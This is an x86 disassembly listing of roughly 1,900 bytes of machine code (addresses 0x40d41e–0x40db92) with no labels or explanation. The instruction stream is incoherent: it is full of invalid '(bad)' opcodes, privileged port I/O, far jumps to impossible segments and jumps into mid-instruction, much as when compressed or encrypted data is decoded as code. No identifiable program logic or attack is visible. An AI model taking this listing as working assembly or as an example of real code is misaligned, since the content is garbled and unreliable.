  40d41e:	mov    ebx,0xeb52f7b0
  40d423:	jne    0x40d476
  40d425:	pop    ds
  40d426:	into   
  40d427:	ret    
  40d428:	hlt    
  40d429:	je     0x40d3bf
  40d42b:	loop   0x40d488
  40d42d:	sub    BYTE PTR [ebp-0x4f],0xdf
  40d431:	jmp    0x40d48b
  40d433:	and    DWORD PTR [edx+edi*1-0x3112f76a],eax
  40d43a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d43b:	push   cs
  40d43c:	sbb    eax,0xfb34eb45
  40d441:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d442:	xor    DWORD PTR [esi-0x11],edx
  40d445:	fcomp  QWORD PTR [edi]
  40d447:	sbb    al,0x3f
  40d449:	test   BYTE PTR [esp+ebp*1+0x23],cl
  40d44d:	(bad)  
  40d44f:	sub    BYTE PTR [edx+0x37],ah
  40d452:	daa    
  40d453:	sub    bl,bh
  40d455:	hlt    
  40d456:	pushf  
  40d457:	sti    
  40d458:	sub    eax,ebx
  40d45a:	xchg   esp,eax
  40d45b:	inc    ebp
  40d45c:	(bad)  
  40d45d:	push   cs
  40d45e:	cmp    al,0xb6
  40d460:	xchg   BYTE PTR [edx+ebx*1],bh
  40d463:	in     al,dx
  40d464:	pop    ss
  40d465:	(bad)  
  40d466:	jmp    0x40d447
  40d468:	das    
  40d469:	cmc    
  40d46a:	sbb    ebx,ebx
  40d46c:	fsub   st,st(4)
  40d46e:	push   ebx
  40d46f:	ja     0x40d458
  40d471:	cwde   
  40d472:	dec    eax
  40d473:	(bad)  
  40d474:	sbb    ebp,esp
  40d476:	dec    ecx
  40d477:	in     eax,dx
  40d478:	mov    ebp,0xf78921f6
  40d47d:	sti    
  40d47e:	neg    BYTE PTR [ebp-0x462c3cb8]
  40d484:	add    BYTE PTR [edx],al
  40d486:	xor    dl,BYTE PTR [ebp+0x4b871a28]
  40d48c:	ror    ebp,1
  40d48e:	test   eax,0x32bd74ff
  40d493:	mov    ds:0x350e45b7,al
  40d498:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d499:	sub    dh,BYTE PTR ds:0x18aa59eb
  40d49f:	rcl    BYTE PTR ds:0x67f6427e,1
  40d4a5:	fldenv [ebp-0x73e2e8e6]
  40d4ab:	sbb    eax,0x4beca351
  40d4b0:	pop    ebp
  40d4b1:	mov    dh,0x30
  40d4b3:	add    DWORD PTR [eax-0x705b18ba],eax
  40d4b9:	nop
  40d4ba:	ficom  WORD PTR [ebp-0x2426e19c]
  40d4c0:	pop    ebp
  40d4c1:	je     0x40d487
  40d4c3:	test   BYTE PTR ds:0xa2a94d0f,al
  40d4c9:	inc    ecx
  40d4ca:	cmp    al,0xb3
  40d4cc:	push   ecx
  40d4cd:	inc    ebx
  40d4ce:	xor    eax,0xb3f4c27
  40d4d3:	jecxz  0x40d4dd
  40d4d5:	icebp  
  40d4d6:	cwde   
  40d4d7:	push   0xc1ef70a8
  40d4dc:	xchg   DWORD PTR [ecx-0x41],edi
  40d4df:	scas   al,BYTE PTR es:[edi]
  40d4e0:	int    0xaf
  40d4e2:	jmp    0x40d551
  40d4e4:	ins    BYTE PTR es:[edi],dx
  40d4e5:	mov    dl,0x9b
  40d4e7:	adc    ecx,esp
  40d4e9:	sbb    eax,0x4a018007
  40d4ee:	aam    0x16
  40d4f0:	sbb    al,0xc4
  40d4f2:	out    0x30,al
  40d4f4:	jae    0x40d560
  40d4f6:	xor    dh,BYTE PTR [ebp+0x58ad9a11]
  40d4fc:	or     ebx,DWORD PTR [eax-0x1fe75fcc]
  40d502:	inc    eax
  40d503:	ror    DWORD PTR [eax-0x7a],0xb6
  40d507:	mov    dl,0x66
  40d509:	pop    es
  40d50a:	mov    dl,0xb2
  40d50c:	xchg   edx,eax
  40d50d:	mov    ds:0x9bf98feb,al
  40d512:	pop    DWORD PTR [esi+0x7b]
  40d515:	jnp    0x40d518
  40d517:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40d519:	js     0x40d4a3
  40d51b:	xchg   esp,eax
  40d51c:	idiv   DWORD PTR [edx]
  40d51e:	push   es
  40d51f:	cmp    al,0xfc
  40d521:	sbb    BYTE PTR [edx+0x56],cl
  40d524:	mov    bl,0xff
  40d526:	cmp    BYTE PTR [edx+0x2c],al
  40d529:	pop    esp
  40d52a:	xor    eax,0x8eef22d3
  40d52f:	icebp  
  40d530:	in     eax,dx
  40d531:	retf   
  40d532:	jne    0x40d4e1
  40d534:	cwde   
  40d535:	add    bl,cl
  40d537:	fs jg  0x40d55c
  40d53a:	scas   al,BYTE PTR es:[edi]
  40d53b:	ret    
  40d53c:	add    al,0x76
  40d53e:	(bad)  [ebx+0x5d129c54]
  40d544:	cmp    dh,cl
  40d546:	mov    edx,0xaf207027
  40d54b:	mov    DWORD PTR [eax],ecx
  40d54d:	in     al,0x1f
  40d54f:	(bad)  
  40d550:	mov    al,ds:0x82a0b847
  40d555:	pop    es
  40d556:	lds    esi,FWORD PTR cs:[eax-0x5ce4f8b]
  40d55d:	sbb    al,0x3
  40d55f:	ret    0xa56a
  40d562:	sbb    ch,bl
  40d564:	mov    al,ds:0x32ead2e1
  40d569:	retf   0x1657
  40d56c:	dec    eax
  40d56d:	push   ebx
  40d56e:	repz aas 
  40d570:	add    esp,esp
  40d572:	pop    es
  40d573:	push   ss
  40d574:	lea    esi,[edi+ebp*4]
  40d577:	adc    al,0x1d
  40d579:	inc    edx
  40d57a:	enter  0x2163,0x6f
  40d57e:	xchg   ebx,eax
  40d57f:	(bad)  
  40d580:	retf   
  40d581:	(bad)  cs:[esi-0x3e]
  40d585:	mov    esp,0x2abdb459
  40d58a:	dec    esi
  40d58b:	mov    eax,ds:0x4ce60a23
  40d590:	lock jle 0x40d544
  40d593:	or     BYTE PTR [ecx-0x266182f9],bh
  40d599:	loope  0x40d520
  40d59b:	dec    edx
  40d59c:	push   ebp
  40d59d:	sbb    al,0x8e
  40d59f:	cmp    BYTE PTR [ebx],0x39
  40d5a2:	xor    ah,0x7a
  40d5a5:	xor    edx,DWORD PTR [esi]
  40d5a7:	mov    bl,0x4d
  40d5a9:	jmp    0x40d56b
  40d5ab:	cli    
  40d5ac:	movlps QWORD PTR [edi+0x5c],xmm0
  40d5b0:	aam    0x1a
  40d5b2:	cmp    al,0x7b
  40d5b4:	xor    al,0x6a
  40d5b6:	sbb    al,BYTE PTR [ebx+eiz*1]
  40d5b9:	js     0x40d555
  40d5bb:	out    dx,al
  40d5bc:	fstp   TBYTE PTR [eax+0x34]
  40d5bf:	inc    BYTE PTR [edi-0x28]
  40d5c2:	hlt    
  40d5c3:	jmp    FWORD PTR [ebx+0xa]
  40d5c6:	aad    0x87
  40d5c8:	in     eax,0x6b
  40d5ca:	add    ebp,DWORD PTR [edi+0x73bd0025]
  40d5d0:	lods   al,BYTE PTR ds:[esi]
  40d5d1:	(bad)  [ecx-0x7bd5a21a]
  40d5d7:	icebp  
  40d5d8:	mov    cl,0xe3
  40d5da:	and    al,0xbd
  40d5dc:	mov    ah,0xd2
  40d5de:	mov    ds,WORD PTR [eax-0x21]
  40d5e1:	ret    0xfb97
  40d5e4:	fist   DWORD PTR ds:0xccbba7df
  40d5ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5eb:	mov    ch,0xce
  40d5ed:	das    
  40d5ee:	(bad)  
  40d5ef:	xchg   esp,eax
  40d5f0:	in     eax,0xc8
  40d5f2:	pop    esi
  40d5f3:	add    ch,BYTE PTR [esi]
  40d5f5:	stc    
  40d5f6:	test   bh,al
  40d5f8:	leave  
  40d5f9:	popf   
  40d5fa:	in     eax,dx
  40d5fb:	xchg   ecx,eax
  40d5fc:	cmp    al,0x4
  40d5fe:	dec    eax
  40d5ff:	xchg   edx,eax
  40d600:	inc    esp
  40d601:	fadd   st,st(4)
  40d603:	push   es
  40d604:	popa   
  40d605:	test   BYTE PTR fs:[edi],dh
  40d608:	mov    WORD PTR [ecx],?
  40d60a:	xchg   ebp,eax
  40d60b:	les    edx,FWORD PTR [ecx]
  40d60d:	clc    
  40d60e:	lock jno 0x40d624
  40d611:	stos   BYTE PTR es:[edi],al
  40d612:	sbb    bh,ch
  40d614:	push   ss
  40d615:	xlat   BYTE PTR ds:[ebx]
  40d616:	adc    DWORD PTR [ecx-0x2aa291a],0xc6039b84
  40d620:	push   0xffffffa2
  40d622:	adc    eax,0x860039e9
  40d627:	rcl    DWORD PTR [eax+0x53],1
  40d62a:	call   0xe2489505
  40d62f:	(bad)  
  40d630:	fdivr  DWORD PTR [esi]
  40d632:	inc    ax
  40d634:	mov    ax,gs:0x54a80608
  40d63b:	cmc    
  40d63c:	jp     0x40d65b
  40d63e:	adc    dl,BYTE PTR [ecx+0xd464ebf]
  40d644:	mov    eax,0x9be48222
  40d649:	add    esp,DWORD PTR [esi+0x1e]
  40d64c:	imul   ebp,esp,0xffffffce
  40d64f:	dec    edx
  40d650:	sub    eax,0x6753367a
  40d655:	mov    edx,0x6d00392f
  40d65a:	sub    edx,DWORD PTR [edx]
  40d65c:	jae    0x40d69b
  40d65e:	jmp    0x638a:0x864e636e
  40d665:	add    edx,ebx
  40d667:	xchg   edi,eax
  40d668:	dec    ecx
  40d669:	jmp    0x78c0:0xf533e2fd
  40d670:	hlt    
  40d671:	add    BYTE PTR [ecx-0x70ba1b42],bh
  40d677:	cmp    esp,DWORD PTR [edi-0x15]
  40d67a:	push   edi
  40d67b:	mov    edx,DWORD PTR [ebx-0x5]
  40d67e:	retf   
  40d67f:	mov    ecx,0x359c10b2
  40d684:	in     eax,dx
  40d685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d686:	loope  0x40d674
  40d688:	sbb    eax,0x924e2fb5
  40d68d:	cmp    eax,0xd1228a3
  40d692:	(bad)  
  40d693:	adc    al,0x60
  40d695:	mov    esp,0x201dc74f
  40d69a:	into   
  40d69b:	and    bl,ah
  40d69d:	pop    esi
  40d69e:	add    eax,0xf87befbe
  40d6a3:	mov    WORD PTR [eax+0x1c8e16a9],es
  40d6a9:	(bad)  
  40d6aa:	sar    ch,1
  40d6ac:	sub    BYTE PTR [bx+si-0x4b],dl
  40d6b0:	je     0x40d6d0
  40d6b2:	js     0x40d70c
  40d6b4:	sti    
  40d6b5:	pop    edx
  40d6b6:	inc    edx
  40d6b7:	ja     0x40d6ca
  40d6b9:	ret    0xff81
  40d6bc:	sbb    al,0x72
  40d6be:	xor    al,0x98
  40d6c0:	cmp    al,0x8d
  40d6c2:	aas    
  40d6c3:	sub    BYTE PTR [ecx-0x5acfca6d],0x7b
  40d6ca:	(bad)  
  40d6cb:	jp     0x40d675
  40d6cd:	popf   
  40d6ce:	int3   
  40d6cf:	cmp    edx,DWORD PTR [ecx+ebp*2-0x37]
  40d6d3:	cli    
  40d6d4:	in     al,dx
  40d6d5:	out    dx,al
  40d6d6:	ja     0x40d744
  40d6d8:	imul   edi,edi,0x41
  40d6db:	pop    es
  40d6dc:	jns    0x40d759
  40d6de:	icebp  
  40d6df:	mov    esi,0x57f6b658
  40d6e4:	loope  0x40d6ac
  40d6e6:	pop    esi
  40d6e7:	call   0xb804fa5d
  40d6ec:	in     al,0x21
  40d6ee:	mov    eax,DWORD PTR [ebp+edx*8+0x6d10a7c3]
  40d6f5:	adc    al,0x8e
  40d6f7:	aas    
  40d6f8:	push   edx
  40d6f9:	jnp    0x40d690
  40d6fb:	out    dx,eax
  40d6fc:	push   cs
  40d6fd:	shr    DWORD PTR [eax+0x23],0x56
  40d701:	jmp    0x405f:0x499582c5
  40d708:	adc    BYTE PTR [edi+0x1012bbc4],bh
  40d70e:	(bad)  
  40d70f:	mov    ecx,0xe32f6c83
  40d714:	mov    eax,DWORD PTR [ecx+0x591119d1]
  40d71a:	out    dx,eax
  40d71b:	pop    edx
  40d71c:	adc    eax,0x15055d9e
  40d721:	pop    edx
  40d722:	lds    esp,FWORD PTR ds:0x8a11617a
  40d728:	jmp    0x3170409f
  40d72d:	ins    BYTE PTR es:[edi],dx
  40d72e:	ss mov cl,0xd8
  40d731:	mov    ch,0x64
  40d733:	inc    edi
  40d734:	cmc    
  40d735:	scas   al,BYTE PTR es:[edi]
  40d736:	xor    BYTE PTR [esp+esi*8-0x42],ah
  40d73a:	daa    
  40d73b:	imul   ecx,DWORD PTR [edx+edi*8-0x72503cb1],0x31
  40d743:	push   edx
  40d744:	fwait
  40d745:	ja     0x40d755
  40d747:	aam    0x66
  40d749:	mov    WORD PTR [esp+ebp*4+0x35dd4094],fs
  40d750:	neg    BYTE PTR [edi]
  40d752:	xor    dl,ch
  40d754:	push   edx
  40d755:	fdiv   QWORD PTR [ecx]
  40d757:	jg     0x40d6f3
  40d759:	sbb    al,0xe9
  40d75b:	test   DWORD PTR [ebp-0x3281403f],0xa47fa97c
  40d765:	pop    ds
  40d766:	inc    edi
  40d767:	sbb    eax,0x99c58c34
  40d76c:	add    DWORD PTR [ebx+0x7284dbdf],ebp
  40d772:	jno    0x40d75a
  40d774:	xor    DWORD PTR [eax+0xa298803],0x52
  40d77b:	xchg   ebx,eax
  40d77c:	sbb    BYTE PTR [eax],dl
  40d77e:	pop    ebx
  40d77f:	dec    esp
  40d780:	sub    edi,eax
  40d782:	add    bl,0xdb
  40d785:	loopne 0x40d7a0
  40d787:	add    dl,BYTE PTR [ebp+0x5c]
  40d78a:	mov    BYTE PTR [ebx+ebp*4+0x7c],ch
  40d78e:	call   0x3ce3:0xde2772bf
  40d795:	dec    eax
  40d796:	fsub   QWORD PTR [ecx+ebx*8-0x2eb698d3]
  40d79d:	outs   dx,DWORD PTR ds:[esi]
  40d79e:	push   esi
  40d79f:	xlat   BYTE PTR ds:[ebx]
  40d7a0:	xor    eax,0x17da1e1e
  40d7a5:	push   es
  40d7a6:	inc    eax
  40d7a7:	loop   0x40d7d0
  40d7a9:	jl     0x40d74c
  40d7ab:	pop    ds
  40d7ac:	jbe    0x40d7b9
  40d7ae:	sar    DWORD PTR ds:0x38f94d8a,0x64
  40d7b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7b6:	test   BYTE PTR [edx-0x23c541ae],ch
  40d7bc:	pop    esi
  40d7bd:	cwde   
  40d7be:	mov    ebx,0x96408dbd
  40d7c3:	inc    ebp
  40d7c4:	cmp    al,0x6e
  40d7c6:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7c8:	call   0x39e24af4
  40d7cd:	jno    0x40d847
  40d7cf:	sub    al,0xc
  40d7d1:	and    bh,BYTE PTR [edi+0x2e133a53]
  40d7d7:	(bad)  
  40d7d8:	adc    ecx,DWORD PTR [ebx+0x11]
  40d7db:	cli    
  40d7dc:	adc    al,BYTE PTR [ecx+0x6ed7682e]
  40d7e2:	mov    eax,ds:0x853d774c
  40d7e7:	jge    0x40d76d
  40d7e9:	loopne 0x40d837
  40d7eb:	enter  0x86a,0xc4
  40d7ef:	xchg   esp,eax
  40d7f0:	ror    DWORD PTR [eax+0x4a39550f],cl
  40d7f6:	loop   0x40d82c
  40d7f8:	mov    BYTE PTR [eax+0x67],bh
  40d7fb:	cmp    eax,0x83b2f06c
  40d800:	sti    
  40d801:	ins    BYTE PTR es:[edi],dx
  40d802:	mov    al,BYTE PTR [edx+0x5d92483a]
  40d808:	sbb    cl,BYTE PTR [eax+0x10]
  40d80b:	add    esp,DWORD PTR [edx+0x68]
  40d80e:	cmp    BYTE PTR [ecx+edx*2+0x7b0423af],bl
  40d815:	dec    edx
  40d816:	lods   eax,DWORD PTR ds:[esi]
  40d817:	mov    al,ds:0x8c0e69e6
  40d81c:	cmp    bh,BYTE PTR ds:0x68cf77aa
  40d822:	scas   eax,DWORD PTR es:[edi]
  40d823:	mov    DWORD PTR [ebx],ecx
  40d825:	mov    esi,0xb3d48992
  40d82a:	xor    eax,0xe6a367dd
  40d82f:	nop
  40d830:	test   al,0x81
  40d832:	outs   dx,BYTE PTR ds:[esi]
  40d833:	(bad)  
  40d834:	out    0x85,eax
  40d836:	mov    bl,0x1b
  40d838:	popa   
  40d839:	add    bh,cl
  40d83b:	sbb    DWORD PTR [ebp+0x7add848a],0x2b908124
  40d845:	rcl    edi,1
  40d847:	or     dl,BYTE PTR [eax+0x7b]
  40d84a:	bound  ecx,QWORD PTR [ebp-0x39aabcc8]
  40d850:	icebp  
  40d851:	pop    ebp
  40d852:	clc    
  40d853:	jo     0x40d87a
  40d855:	dec    edi
  40d856:	cmp    eax,0xcf9fac5a
  40d85b:	dec    edi
  40d85c:	aam    0x4c
  40d85e:	xchg   esi,eax
  40d85f:	lds    ebx,FWORD PTR [esi]
  40d861:	push   ds
  40d862:	jge    0x40d8aa
  40d864:	shl    DWORD PTR [ecx-0x4f437a1c],0x30
  40d86b:	xlat   BYTE PTR ds:[ebx]
  40d86c:	cmp    DWORD PTR [ecx],eax
  40d86e:	lahf   
  40d86f:	test   esp,ecx
  40d871:	push   eax
  40d872:	inc    edi
  40d873:	push   esp
  40d874:	lock stc 
  40d876:	stos   BYTE PTR es:[edi],al
  40d877:	mov    WORD PTR [ebp+0x4e],gs
  40d87a:	jae    0x40d811
  40d87c:	popf   
  40d87d:	or     edx,ebx
  40d87f:	out    0xa0,al
  40d881:	xchg   edx,eax
  40d882:	xor    al,0x3f
  40d884:	adc    eax,0x6c813f0e
  40d889:	mov    ecx,0xb73f575
  40d88e:	outs   dx,BYTE PTR ds:[esi]
  40d88f:	jae    0x40d82f
  40d891:	in     eax,dx
  40d892:	ret    0x2ffa
  40d895:	sub    DWORD PTR [esi-0x5f],0x9ab1d9af
  40d89c:	cmp    edx,esi
  40d89e:	jg     0x40d913
  40d8a0:	push   ecx
  40d8a1:	push   ss
  40d8a2:	pop    esi
  40d8a3:	jb     0x40d8cf
  40d8a5:	les    ebx,FWORD PTR ds:0xc5756390
  40d8ab:	adc    al,0xf0
  40d8ad:	stos   BYTE PTR es:[edi],al
  40d8ae:	or     BYTE PTR [ebp-0x19],dl
  40d8b1:	into   
  40d8b2:	fadd   QWORD PTR [ecx*2-0x245cea48]
  40d8b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8ba:	xchg   esp,eax
  40d8bb:	jmp    0x7b61:0x34cdb97a
  40d8c2:	(bad)  
  40d8c3:	sbb    eax,0x2dcbe08
  40d8c8:	retf   0xe984
  40d8cb:	inc    ecx
  40d8cc:	fnstenv [ecx-0x2d]
  40d8cf:	xchg   dh,cl
  40d8d1:	pop    ecx
  40d8d2:	pop    ebx
  40d8d3:	jmp    0x52ea062
  40d8d8:	sub    cl,al
  40d8da:	xchg   edx,eax
  40d8db:	iret   
  40d8dc:	nop
  40d8dd:	ret    0x69b2
  40d8e0:	rcr    DWORD PTR [esi],1
  40d8e2:	lods   eax,DWORD PTR ds:[esi]
  40d8e3:	sti    
  40d8e4:	mov    ebx,0x25282cac
  40d8e9:	push   edx
  40d8ea:	shr    DWORD PTR ds:0x1c822c9e,1
  40d8f0:	test   al,0x26
  40d8f2:	repz inc esp
  40d8f4:	xchg   WORD PTR [ebx],bp
  40d8f7:	inc    ebx
  40d8f8:	ret    0x909e
  40d8fb:	cmp    eax,0x3c538c76
  40d900:	dec    esp
  40d901:	push   esp
  40d902:	add    eax,0x5f
  40d905:	cmp    al,0x9e
  40d907:	jmp    FWORD PTR [ecx+eiz*4-0x7ed5ef91]
  40d90e:	into   
  40d90f:	fild   DWORD PTR [ecx]
  40d911:	mov    bl,0x3
  40d913:	mov    ecx,0x93cb83f5
  40d918:	xlat   BYTE PTR ds:[ebx]
  40d919:	jge    0x40d925
  40d91b:	jbe    0x40d90d
  40d91d:	fisubr WORD PTR [ecx-0x215b11c9]
  40d923:	lods   eax,DWORD PTR ds:[esi]
  40d924:	mov    ebx,0xe3858f5d
  40d929:	stos   DWORD PTR es:[edi],eax
  40d92a:	rcr    BYTE PTR [edx],1
  40d92c:	pop    eax
  40d92d:	add    esi,DWORD PTR [eax-0x577dc731]
  40d933:	fldenv [esi]
  40d935:	not    DWORD PTR [ebx+0x36]
  40d938:	lahf   
  40d939:	je     0x40d990
  40d93b:	pop    ss
  40d93c:	pushf  
  40d93d:	fidivr WORD PTR [eax+0x3e]
  40d940:	and    BYTE PTR [edx+0x22cac576],al
  40d946:	je     0x40d925
  40d948:	push   eax
  40d949:	pop    es
  40d94a:	or     al,bl
  40d94c:	sbb    eax,0x4a872f7f
  40d951:	hlt    
  40d952:	jo     0x40d8e9
  40d954:	inc    esi
  40d956:	fadd   DWORD PTR [edi-0x39cd6793]
  40d95c:	into   
  40d95d:	or     BYTE PTR [esi-0x31],ah
  40d960:	pop    ebp
  40d961:	xchg   ecx,eax
  40d962:	call   0xf536ba08
  40d967:	cmp    edi,edx
  40d969:	xor    dh,cl
  40d96b:	sbb    BYTE PTR [edi],cl
  40d96d:	mov    edi,0x15976618
  40d972:	repz xchg esi,eax
  40d974:	push   0xfffffff9
  40d976:	or     dl,BYTE PTR [edx+0x280eccf3]
  40d97c:	ja     0x40d923
  40d97e:	icebp  
  40d97f:	jg     0x40d9a9
  40d981:	push   ebp
  40d982:	push   0x6fa7d45a
  40d987:	cli    
  40d988:	lods   al,BYTE PTR ds:[esi]
  40d989:	xchg   edx,eax
  40d98a:	mov    BYTE PTR [edi-0x7c],ch
  40d98d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d98e:	sub    al,0xd0
  40d990:	je     0x40d96d
  40d992:	loope  0x40da0b
  40d994:	int    0x7f
  40d996:	les    edi,FWORD PTR [edi-0x39]
  40d999:	test   DWORD PTR cs:[ecx+0x7a],ebx
  40d99d:	test   eax,0xfd007d70
  40d9a2:	or     dh,BYTE PTR [esi-0x4f]
  40d9a5:	mov    ds:0xbcf1bace,al
  40d9aa:	rcr    DWORD PTR [edx],cl
  40d9ac:	adc    cl,BYTE PTR [eax+0x54]
  40d9af:	fdivr  st,st(6)
  40d9b1:	jg     0x40da0f
  40d9b3:	rcr    BYTE PTR [ebp+edx*8+0x71db5a4c],1
  40d9ba:	dec    ebx
  40d9bb:	sti    
  40d9bc:	sub    al,0xdb
  40d9be:	sub    edx,DWORD PTR [edx+0x16]
  40d9c1:	push   eax
  40d9c2:	aam    0x40
  40d9c4:	inc    ebp
  40d9c5:	jnp    0x40d9c3
  40d9c7:	imul   esp
  40d9c9:	add    BYTE PTR [esi-0x277592e0],0xa5
  40d9d0:	xchg   BYTE PTR ds:0x88aba533,al
  40d9d6:	xor    eax,0xeec1d117
  40d9db:	mov    al,0xe2
  40d9dd:	push   edi
  40d9de:	pop    ecx
  40d9df:	loopne 0x40d99e
  40d9e1:	mov    esp,0xcada0f8d
  40d9e6:	mov    edi,DWORD PTR [edi-0x4a512c05]
  40d9ec:	mov    eax,ds:0x95b6ab70
  40d9f1:	in     eax,0xa
  40d9f3:	jne    0x40d9b0
  40d9f5:	push   es
  40d9f6:	sbb    BYTE PTR [eax-0x18d17df9],dl
  40d9fc:	inc    ecx
  40d9fd:	dec    ebx
  40d9fe:	shr    BYTE PTR [ebp-0x2b499c7b],cl
  40da04:	fs inc esi
  40da06:	xchg   bh,bh
  40da08:	add    dl,BYTE PTR [edi]
  40da0a:	add    esi,edx
  40da0c:	and    ecx,eax
  40da0e:	adc    BYTE PTR es:[edx-0x1fe277ef],bh
  40da15:	push   ebp
  40da16:	(bad)  
  40da17:	ficom  WORD PTR [esp+ebx*2-0x79cbd36d]
  40da1e:	data16 int3 
  40da20:	pop    es
  40da21:	mov    dh,0xed
  40da23:	xor    BYTE PTR [edi+0x69a2fdb1],bh
  40da29:	push   0x945053c0
  40da2e:	js     0x40d9cb
  40da30:	inc    ebp
  40da31:	jno    0x40d9ce
  40da33:	add    al,0xb8
  40da35:	push   esi
  40da36:	pusha  
  40da37:	sub    al,cl
  40da39:	pop    esp
  40da3a:	jnp    0x40d9f6
  40da3c:	jmp    FWORD PTR [eax-0x6a]
  40da3f:	(bad)  
  40da40:	inc    edi
  40da41:	pop    ecx
  40da42:	cwde   
  40da43:	in     al,dx
  40da44:	sub    BYTE PTR [esi-0x6f],cl
  40da47:	adc    DWORD PTR [eax+0x73],eax
  40da4a:	in     al,0x81
  40da4c:	fldcw  WORD PTR [ecx+0x2]
  40da4f:	jb     0x40da6b
  40da51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da52:	mov    bh,0xa7
  40da54:	add    ecx,DWORD PTR [edi]
  40da56:	mov    al,al
  40da58:	dec    ecx
  40da59:	jo     0x40d9f6
  40da5b:	jmp    0x40da10
  40da5d:	dec    edx
  40da5e:	ss mov ah,0x9f
  40da61:	mov    al,0x4
  40da63:	gs xor al,ch
  40da66:	add    al,0xc
  40da68:	ins    DWORD PTR es:[edi],dx
  40da69:	sbb    dh,BYTE PTR [ebx]
  40da6b:	xor    dh,BYTE PTR [esi]
  40da6d:	jp     0x40da9d
  40da6f:	call   0xe1b15668
  40da74:	push   ss
  40da75:	aam    0xa0
  40da77:	mov    ebp,0x19b91fba
  40da7c:	mov    ah,0x70
  40da7e:	ud0    esi,esi
  40da81:	or     bh,al
  40da83:	push   cs
  40da84:	add    BYTE PTR [edx],ah
  40da86:	adc    ah,BYTE PTR [eax-0x20]
  40da89:	and    ah,dh
  40da8b:	jp     0x40dadd
  40da8d:	stc    
  40da8e:	mov    esi,0xc8b456bc
  40da93:	cmp    esi,edx
  40da95:	push   ecx
  40da96:	stos   DWORD PTR es:[edi],eax
  40da97:	sub    DWORD PTR [ebp-0x70],eax
  40da9a:	xor    dh,BYTE PTR [esi]
  40da9c:	push   eax
  40da9d:	add    al,0x6
  40da9f:	imul   edi,DWORD PTR [eax+eiz*8-0x30],0xffffffb4
  40daa4:	lods   eax,DWORD PTR ds:[esi]
  40daa5:	sar    dl,0x38
  40daa8:	jo     0x40daa3
  40daaa:	lock pop ebx
  40daac:	mov    ah,0x9f
  40daae:	fdiv   QWORD PTR [esi]
  40dab0:	loopne 0x40daa3
  40dab2:	mov    edi,0xc75dd78a
  40dab7:	inc    ebx
  40dab8:	cwde   
  40dab9:	xchg   esi,eax
  40daba:	cmp    al,0xc5
  40dabc:	faddp  st(0),st
  40dabe:	retf   0x9f31
  40dac1:	ds cdq 
  40dac3:	cli    
  40dac4:	xor    DWORD PTR [eax-0x6a],ebx
  40dac7:	add    BYTE PTR [edi+0x6e],0x60
  40dacb:	stc    
  40dacc:	stos   BYTE PTR es:[edi],al
  40dacd:	mov    WORD PTR [ebx+0x12],ss
  40dad0:	jno    0x40db51
  40dad2:	add    eax,0xd880c46c
  40dad7:	dec    eax
  40dad8:	jg     0x40dae9
  40dada:	loop   0x40db3b
  40dadc:	pop    ds
  40dadd:	test   al,0xf0
  40dadf:	mov    bl,0xce
  40dae1:	repnz adc BYTE PTR [ebp-0x7c],al
  40dae5:	inc    edi
  40dae6:	int    0x88
  40dae8:	loop   0x40db55
  40daea:	scas   al,BYTE PTR es:[edi]
  40daeb:	adc    al,0x54
  40daed:	pop    eax
  40daee:	push   ebp
  40daef:	adc    bl,BYTE PTR [eax-0xf236a6c]
  40daf5:	ins    DWORD PTR es:[edi],dx
  40daf6:	ins    BYTE PTR es:[edi],dx
  40daf7:	xchg   ecx,eax
  40daf8:	and    eax,0xde9966a1
  40dafd:	push   ebx
  40dafe:	dec    edi
  40daff:	fimul  DWORD PTR [ebx]
  40db01:	inc    ecx
  40db02:	inc    ebx
  40db03:	clc    
  40db04:	and    ch,bh
  40db06:	jne    0x40db09
  40db08:	std    
  40db09:	dec    eax
  40db0a:	lods   eax,DWORD PTR ds:[esi]
  40db0b:	jecxz  0x40daa9
  40db0d:	xchg   esp,eax
  40db0e:	pop    ss
  40db0f:	or     bl,bh
  40db11:	mov    dl,0x69
  40db13:	pop    ecx
  40db14:	mov    eax,0x59f9870
  40db19:	loopne 0x40db1e
  40db1b:	pop    ebp
  40db1c:	jne    0x40db31
  40db1e:	outs   dx,BYTE PTR ds:[esi]
  40db1f:	xor    edx,ecx
  40db21:	cmp    BYTE PTR gs:[esp+eiz*4-0x5ff0f3e3],ah
  40db29:	out    0xc3,eax
  40db2b:	(bad)  
  40db2c:	mov    ebx,0x177f36ab
  40db31:	mov    al,ds:0x5e1a6ab7
  40db36:	and    eax,0x47d2f58f
  40db3b:	and    ah,al
  40db3d:	jo     0x40dba0
  40db3f:	mov    bl,bl
  40db41:	(bad)  
  40db42:	in     eax,0xf4
  40db44:	scas   eax,DWORD PTR es:[edi]
  40db45:	mov    bl,0x49
  40db47:	ds jle 0x40db08
  40db4a:	and    ch,BYTE PTR [ebx]
  40db4c:	cli    
  40db4d:	sbb    al,0x5e
  40db4f:	loope  0x40db26
  40db51:	cli    
  40db52:	int    0xe
  40db54:	or     edi,DWORD PTR [ebp+eax*1+0x54f5af0a]
  40db5b:	inc    esi
  40db5c:	pop    edx
  40db5d:	into   
  40db5e:	add    DWORD PTR [eax],eax
  40db60:	push   ebp
  40db61:	es sti 
  40db63:	pop    ss
  40db64:	cmp    edi,DWORD PTR [edi]
  40db66:	retf   
  40db67:	out    0x8a,eax
  40db69:	add    ebx,DWORD PTR [ecx]
  40db6b:	push   0x9c7c0dab
  40db70:	mov    al,0xab
  40db72:	out    0x17,eax
  40db74:	adc    bl,BYTE PTR [edi+0x70371c0c]
  40db7a:	stos   DWORD PTR es:[edi],eax
  40db7b:	jle    0x40dbb3
  40db7d:	sar    BYTE PTR [edx],1
  40db7f:	shr    BYTE PTR [edi],1
  40db81:	ret    
  40db82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db83:	and    ecx,DWORD PTR [ecx+ecx*8+0x6d62c9c9]
  40db8a:	add    al,0x40
  40db8c:	mov    DWORD PTR ds:0x7f46caf6,edi
  40db92:	das    
